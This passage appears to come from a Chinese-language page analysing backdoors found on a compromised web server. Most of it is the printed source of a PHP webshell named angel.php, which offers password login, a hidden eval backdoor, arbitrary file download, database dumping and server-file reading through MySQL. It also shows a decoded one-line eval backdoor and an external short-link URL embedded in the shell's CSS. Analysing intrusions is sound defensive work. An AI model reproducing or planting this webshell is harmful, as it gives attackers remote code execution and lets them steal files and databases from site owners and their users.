underline;\">?&gt;</span>\n</pre>\n</div>\n\n<p>\n解码后的结果\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #6699cc;\">@eval</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_POST</span>[<span style=\"color: #66cccc;\">'wen'</span>]);\n</pre>\n</div>\n\n<p>\n上面的脚本可以注入任意的代码。\n</p>\n</li>\n\n<li><code>./uc_server/data/tmp/angel.php</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-web\">&lt;?php\nerror_reporting(7);\n@set_magic_quotes_runtime(0);\nob_start();\n$mtime = explode(' ', microtime());\n$starttime = $mtime[1] + $mtime[0];\ndefine('SA_ROOT', str_replace('\\\\', '/', dirname(__FILE__)).'/');\ndefine('IS_WIN', DIRECTORY_SEPARATOR == '\\\\');\ndefine('IS_COM', class_exists('COM') ? 1 : 0 );\ndefine('IS_GPC', get_magic_quotes_gpc());\n$dis_func = get_cfg_var('disable_functions');\ndefine('IS_PHPINFO', (!eregi(\"phpinfo\",$dis_func)) ? 1 : 0 );\n@set_time_limit(0);@preg_replace(\"/[email]/e\",$_POST['Id'],\"error\");\n\nforeach($_POST as $key =&gt; $value) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (IS_GPC) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $value = s_array($value);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $$key = $value;\n}\n/*===================== &#31243;&#24207;&#37197;&#32622; =====================*/\n\n//echo encode_pass('angel');exit;\n//angel = ec38fe2a8497e0a8d6d349b3533038cb\n// &#22914;&#26524;&#38656;&#35201;&#23494;&#30721;&#39564;&#35777;,&#35831;&#20462;&#25913;&#30331;&#38470;&#23494;&#30721;,&#30041;&#31354;&#20026;&#19981;&#38656;&#35201;&#39564;&#35777;\n$pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel\n\n//&#22914;&#24744;&#23545; cookie &#20316;&#29992;&#33539;&#22260;&#26377;&#29305;&#27530;&#35201;&#27714;, &#25110;&#30331;&#24405;&#19981;&#27491;&#24120;, &#35831;&#20462;&#25913;&#19979;&#38754;&#21464;&#37327;, &#21542;&#21017;&#35831;&#20445;&#25345;&#40664;&#35748;\n// cookie &#21069;&#32512;\n$cookiepre = '';\n// cookie &#20316;&#29992;&#22495;\n$cookiedomain = '';\n// cookie &#20316;&#29992;&#36335;&#24452;\n$cookiepath = '/';\n// cookie &#26377;&#25928;&#26399;\n$cookielife = 86400;\n\n//&#31243;&#24207;&#25628;&#32034;&#21487;&#20889;&#25991;&#20214;&#30340;&#31867;&#22411;\n!$writabledb &amp;&amp; $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';\n/*===================== &#37197;&#32622;&#32467;&#26463; =====================*/\n\n$charsetdb = array('','armscii8','ascii','big5','binary','cp1250','cp1251','cp12<span style=\"text-decoration: underline;\">56','cp1257','cp850','cp852','cp866','cp932','dec8','euc-jp','euc-kr','gb2312','gbk','geostd8','greek','hebrew','hp8','keybcs2','koi8r','koi8u','latin1','latin2','latin5','latin7','macce','macroman','sjis','swe7','tis620','ucs2','ujis','utf8');</span>\nif ($charset == 'utf8') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header(\"content-Type: text/html; charset=utf-8\");\n} elseif ($charset == 'big5') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header(\"content-Type: text/html; charset=big5\");\n} elseif ($charset == 'gbk') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header(\"content-Type: text/html; charset=gbk\");\n} elseif ($charset == 'latin1') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header(\"content-Type: text/html; charset=iso-8859-2\");\n} elseif ($charset == 'euc-kr') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header(\"content-Type: text/html; charset=euc-kr\");\n} elseif ($charset == 'euc-jp') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header(\"content-Type: text/html; charset=euc-jp\");\n}\n\n$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];\n$timestamp = time();\n\n/*===================== &#36523;&#20221;&#39564;&#35777; =====================*/\nif ($action == \"logout\") {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   scookie('loginpass', '', -86400 * 365);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @header('Location: '.$self);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exit;\n}\nif($pass) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($action == 'login') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($pass == encode_pass($password)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   scookie('loginpass',encode_pass($password));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @header('Location: '.$self);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exit;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($_COOKIE['loginpass']) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($_COOKIE['loginpass'] != $pass) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   loginpage();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   loginpage();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n/*===================== &#39564;&#35777;&#32467;&#26463; =====================*/\n\n$errmsg = '';\n!$action &amp;&amp; $action = 'file';\n\n// &#26597;&#30475;PHPINFO\nif ($action == 'phpinfo') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (IS_PHPINFO) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   phpinfo();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exit;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $errmsg = 'phpinfo() function has non-permissible';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\n// &#19979;&#36733;&#25991;&#20214;\nif ($doing == 'downfile' &amp;&amp; $thefile) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!@file_exists($thefile)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $errmsg = 'The file you want Downloadable was nonexistent';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fileinfo = pathinfo($thefile);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header('Content-type: application/x-'.$fileinfo['extension']);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header('Content-Disposition: attachment; filename='.$fileinfo['basename'<span style=\"text-decoration: underline;\">]);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header('Content-Length: '.filesize($thefile));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @readfile($thefile);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exit;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\n// &#30452;&#25509;&#19979;&#36733;&#22791;&#20221;&#25968;&#25454;&#24211;\nif ($doing == 'backupmysql' &amp;&amp; !$saveasfile) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!$table) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $errmsg ='Please choose the table';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbp<span style=\"text-decoration: underline;\">ort);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filename = basename($dbname.'.sql');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header('Content-type: application/unknown');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header('Content-Disposition: attachment; filename='.$filename);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($table as $k =&gt; $v) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($v) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sqldumptable($v);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   mysql_close();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exit;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\n// &#36890;&#36807;MYSQL&#19979;&#36733;&#25991;&#20214;\nif($doing=='mysqldown'){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!$dbname) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $errmsg = 'Please input dbname';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbp<span style=\"text-decoration: underline;\">ort);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!file_exists($mysqldlfile)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $errmsg = 'The file you want Downloadable was nonexistent';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $result = q(\"select load_file('$mysqldlfile');\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(!$result){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   q(\"DROP TABLE IF EXISTS tmp_angel;\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   q(\"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#29992;&#26102;&#38388;&#25139;&#26469;&#34920;&#31034;&#25130;&#26029;,&#36991;&#20813;&#20986;&#29616;&#35835;&#21462;&#33258;&#36523;&#25110;&#21253;&#21547;__angel_1111111111_eof__&#30340;&#25991;&#20214;&#26102;&#19981;&#23436;&#25972;&#30340;&#24773;&#20917;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   q(\"LOAD DATA LOCAL INFILE '\".addslashes($mysqldlfile).\"' INTO TA<span style=\"text-decoration: underline;\">BLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $result = q(\"select content from tmp_angel\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   q(\"DROP TABLE tmp_angel\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $row = @mysql_fetch_array($result);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!$row) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $errmsg = 'Load file failed '.mysql_error();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fileinfo = pathinfo($mysqldlfile);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header('Content-type: application/x-'.$fileinfo['extension']);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header('Content-Disposition: attachment; filename='.$fileinfo['b<span style=\"text-decoration: underline;\">asename']);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   header(\"Accept-Length: \".strlen($row[0]));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo $row[0];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exit;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\n?&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"&gt;\n&lt;title&gt;&lt;?php echo $action.' - '.$_SERVER['HTTP_HOST'];?&gt;&lt;/title&gt;\n&lt;style type=\"text/css\"&gt;\n<span style=\"color: #99cc99;\">body</span>,<span style=\"color: #99cc99;\">td</span>{<span style=\"color: #ffcc66;\">font:</span> 12px Arial,Tahoma;<span style=\"color: #ffcc66;\">line-height:</span> 16px;}\n<span style=\"color: #99cc99;\">.input</span>{<span style=\"color: #ffcc66;\">font:</span>12px Arial,Tahoma;<span style=\"color: #ffcc66;\">background:</span><span style=\"color: #000000; background-color: #fff;\">#fff</span>;<span style=\"color: #ffcc66;\">border:</span> 1px solid <span style=\"color: #ffffff; background-color: #666;\">#666</span>;<span style=\"color: #ffcc66;\">padding:</span>2px<span style=\"text-decoration: underline;\">;</span><span style=\"color: #ffcc66; text-decoration: underline;\">height:</span><span style=\"text-decoration: underline;\">22px;}</span>\n<span style=\"color: #99cc99;\">.area</span>{<span style=\"color: #ffcc66;\">font:</span>12px 'Courier New', Monospace;<span style=\"color: #ffcc66;\">background:</span><span style=\"color: #000000; background-color: #fff;\">#fff</span>;<span style=\"color: #ffcc66;\">border:</span> 1px solid <span style=\"color: #ffffff; background-color: #666;\">#666</span>;<span style=\"color: #ffcc66; text-decoration: underline;\">padding:</span><span style=\"text-decoration: underline;\">2px;}</span>\n<span style=\"color: #99cc99;\">.bt </span>{<span style=\"color: #ffcc66;\">border-color:</span><span style=\"color: #000000; background-color: #b0b0b0;\">#b0b0b0</span>;<span style=\"color: #ffcc66;\">background:</span><span style=\"color: #ffffff; background-color: #3d3d3d;\">#3d3d3d</span> <span style=\"color: #cc99cc;\">url</span>(<span style=\"color: #ffcc66;\">http:</span>//t.cn/zRymOgc);<span style=\"color: #ffcc66;\">color:</span><span style=\"color: #000000; background-color: #ffffff;\">#fff</span><span style=\"color: #000000; background-color: #ffffff; text-decoration: underline;\">fff</span><span style=\"text-decoration: underline;\">;</span><span style=\"color: #ffcc66; text-decoration: underline;\">font:</span><span style=\"text-decoration: underline;\">12px Arial,Tahoma;</span><span style=\"color: #ffcc66; text-decoration: underline;\">height:</span><span style=\"text-decoration: underline;\">22px;}</span>\n<span style=\"color: #99cc99;\">a </span>{<span style=\"color: #ffcc66;\">color:</span> <span style=\"color: #ffffff; background-color: #00f;\">#00f</span>;<span style=\"color: #ffcc66;\">text-decoration:</span>underline;}\n<span style=\"color: #99cc99;\">a</span><span style=\"color: #cc99cc;\">:hover</span>{<span style=\"color: #ffcc66;\">color:</span> <span style=\"color: #ffffff; background-color: #f00;\">#f00</span>;<span style=\"color: #ffcc66;\">text-decoration:</span>none;}\n<span style=\"color: #99cc99;\">.alt1 td</span>{<span style=\"color: #ffcc66;\">border-top:</span>1px solid <span style=\"color: #000000; background-color: #fff;\">#fff</span>;<span style=\"color: #ffcc66;\">border-bottom:</span>1px solid <span style=\"color: #000000; background-color: #ddd;\">#ddd</span>;<span style=\"color: #ffcc66;\">background:</span><span style=\"color: #000000; background-color: #f1f1f1;\">#f1f1</span><span style=\"color: #000000; background-color: #f1f1f1; text-decoration: underline;\">f1</span><span style=\"text-decoration: underline;\">;</span><span style=\"color: #ffcc66; text-decoration: underline;\">padding:</span><span style=\"text-decoration: underline;\">5px 15px 5px 5px;}</span>\n<span style=\"color: #99cc99;\">.alt2 td</span>{<span style=\"color: #ffcc66;\">border-top:</span>1px solid <span style=\"color: #000000; background-color: #fff;\">#fff</span>;<span style=\"color: #ffcc66;\">border-bottom:</span>1px solid <span style=\"color: #000000; background-color: #ddd;\">#ddd</span>;<span style=\"color: #ffcc66;\">background:</span><span style=\"color: #000000; background-color: #f9f9f9;\">#f9f9</span><span style=\"color: #000000; background-color: #f9f9f9; text-decoration: underline;\">f9</span><span style=\"text-decoration: underline;\">;</span><span style=\"color: #ffcc66; text-decoration: underline;\">padding:</span><span style=\"text-decoration: underline;\">5px 15px 5px 5px;}</span>\n<span style=\"color: #99cc99;\">.focus td</span>{<span style=\"color: #ffcc66;\">border-top:</span>1px solid <span style=\"color: #000000; background-color: #fff;\">#fff</span>;<span style=\"color: #ffcc66;\">border-bottom:</span>1px solid <span style=\"color: #000000; background-color: #ddd;\">#ddd</span>;<span style=\"color: #ffcc66;\">background:</span><span style=\"color: #000000; background-color: #ffffaa;\">#fff</span><span style=\"color: #000000; background-color: #ffffaa; text-decoration: underline;\">faa</span><span style=\"text-decoration: underline;\">;</span><span style=\"color: #ffcc66; text-decoration: underline;\">padding:</span><span style=\"text-decoration: underline;\">5px 15px 5px 5px;}</span>\n<span style=\"color: #99cc99;\">.head td</span>{<span style=\"color: #ffcc66;\">border-top:</span>1px solid <span style=\"color: #000000; background-color: #fff;\">#fff</span>;<span style=\"color: #ffcc66;\">border-bottom:</span>1px solid <span style=\"color: #000000; background-color: #ddd;\">#ddd</span>;<span style=\"color: #ffcc66;\">background:</span><span style=\"color: #000000; background-color: #e9e9e9;\">#e9e9</span><span style=\"color: #000000; background-color: #e9e9e9; text-decoration: underline;\">e9</span><span style=\"text-decoration: underline;\">;</span><span style=\"color: #ffcc66; text-decoration: underline;\">padding:</span><span style=\"text-decoration: underline;\">5px 15px 5px 5px;</span><span style=\"color: #ffcc66; text-decoration: underline;\">font-weight:</span><span style=\"text-decoration: underline;\">bold;}</span>\n<span style=\"color: #99cc99;\">.head td span</span>{<span style=\"color: #ffcc66;\">font-weight:</span>normal;}\n<span style=\"color: #99cc99;\">.infolist </span>{<span style=\"color: #ffcc66;\">padding:</span>10px;<span style=\"color: #ffcc66;\">margin:</span>10px 0 20px 0;<span style=\"color: #ffcc66;\">background:</span><span style=\"color: #000000; background-color: #F1F1F1;\">#F1F1F1</span>;<span style=\"color: #ffcc66;\">border:</span>1px solid<span style=\"text-decoration: underline;\"> </span><span style=\"color: #000000; background-color: #ddd; text-decoration: underline;\">#ddd</span><span style=\"text-decoration: underline;\">;}</span>\n<span style=\"color: #99cc99;\">form</span>{<span style=\"color: #ffcc66;\">margin:</span>0;<span style=\"color: #ffcc66;\">padding:</span>0;}\n<span style=\"color: #99cc99;\">h2</span>{<span style=\"color: #ffcc66;\">margin:</span>0;<span style=\"color: #ffcc66;\">padding:</span>0;<span style=\"color: #ffcc66;\">height:</span>24px;<span style=\"color: #ffcc66;\">line-height:</span>24px;<span style=\"color: #ffcc66;\">font-size:</span>14px;<span style=\"color: #ffcc66;\">color:</span><span style=\"color: #ffffff; background-color: #5B686F;\">#5B686F</span>;<span style=\"text-decoration: underline;\">}</span>\n<span style=\"color: #99cc99;\">ul.info li</span>{<span style=\"color: #ffcc66;\">margin:</span>0;<span style=\"color: #ffcc66;\">color:</span><span style=\"color: #ffffff; background-color: #444;\">#444</span>;<span style=\"color: #ffcc66;\">line-height:</span>24px;<span style=\"color: #ffcc66;\">height:</span>24px;}\n<span style=\"color: #99cc99;\">u</span>{<span style=\"color: #ffcc66;\">text-decoration:</span> none;<span style=\"color: #ffcc66;\">color:</span><span style=\"color: #ffffff; background-color: #777;\">#777</span>;<span style=\"color: #ffcc66;\">float:</span>left;<span style=\"color: #ffcc66;\">display:</span>block;<span style=\"color: #ffcc66;\">width:</span>150px;<span style=\"color: #ffcc66;\">margin-r</span><span style=\"color: #ffcc66; text-decoration: underline;\">ight:</span><span style=\"text-decoration: underline;\">10px;}</span>\n<span style=\"color: #99cc99;\">.drives</span>{<span style=\"color: #ffcc66;\">padding:</span>5px;}\n<span style=\"color: #99cc99;\">.drives span </span>{<span style=\"color: #ffcc66;\">margin:</span>auto 7px;}\n&lt;/style&gt;\n&lt;script type=\"text/javascript\"&gt;\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">CheckAll</span>(form) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> for(var</span> <span style=\"color: #ffcc66;\">i</span>=0;i&lt;form.elements.length;i++) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> var</span> <span style=\"color: #ffcc66;\">e</span> = form.elements[i];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (e.name != 'chkall')\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   e.checked = form.chkall.checked;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n<span style=\"color: #99cc99;\">function</span> $(id) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> return</span> document.<span style=\"color: #f99157;\">getElementById</span>(id);\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">createdir</span>(){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> var</span> <span style=\"color: #ffcc66;\">newdirname</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   newdirname = <span style=\"color: #f99157;\">prompt</span>('Please input the directory name:', ''  );\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (!newdirname)<span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('createdir').newdirname.value=newdirname;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('createdir').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">fileperm</span>(pfile){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> var</span> <span style=\"color: #ffcc66;\">newperm</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   newperm = <span style=\"color: #f99157;\">prompt</span>('Current file:'+pfile+'\\nPlease input new attribute:', '');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span> (!newperm)<span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('fileperm').newperm.value=newperm;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('fileperm').pfile.value=pfile;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('fileperm').<span style=\"color: #f99157;\">submit</span>();\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">copyfile</span>(sname){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> var</span> <span style=\"color: #ffcc66;\">tofile</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   tofile = <span style=\"color: 